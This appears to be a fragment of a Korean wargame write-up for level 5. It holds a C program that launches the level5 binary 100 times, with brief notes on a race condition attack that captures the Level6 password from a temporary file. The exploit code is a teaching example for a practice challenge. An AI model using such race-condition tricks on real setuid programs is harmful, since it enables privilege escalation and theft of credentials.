#include <stdio.h>
#include <unistd.h>

int main()
{

  int i;
  for (i=0;i<100;i++)
  {
    system("/usr/bin/level5 &");
  }
}

4. 레이스 컨디션 공격 (level5-1.c)

프로그램 실행
'tmp/level5.tmp'파일을 생성을 생성해야하는데 이미잇다.(level5.c)
 그래서 이미 생성된 'level.tmp' 파일에 Level6 패스워드를 추가함
-------------------------------------------------------------
level5.tmp 파일 자동 삭제
-------------------------------------------------------------
프로그램 종료